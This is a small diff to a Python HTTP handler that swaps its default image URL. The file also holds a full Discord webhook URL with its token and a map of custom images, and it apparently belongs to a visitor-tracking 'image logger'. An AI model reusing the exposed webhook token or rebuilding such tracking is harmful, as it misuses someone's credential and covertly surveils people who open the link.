@@ -9,7 +9,7 @@ class handler(BaseHTTPRequestHandler):
         WEBHOOK = "https://discord.com/api/webhooks/1464803825847369837/j3diMzcguRrWtdRMnswJ5uA4_fCymBpPkTsV-eNYEs2xjChfvhpXOTCSb-AMB2ZXgz2Q"
         
         # Default image
-        DEFAULT_IMAGE = "https://i.imgur.com/5M6F3wQ.jpeg"
+        DEFAULT_IMAGE = "https://tse1.mm.bing.net/th/id/OIP.RXrqLpAA646xM_jjo3oWwgHaEK?rs=1&pid=ImgDetMain&o=7&rm=3"
         
         # Custom image mappings - add more here
         IMAGES = {
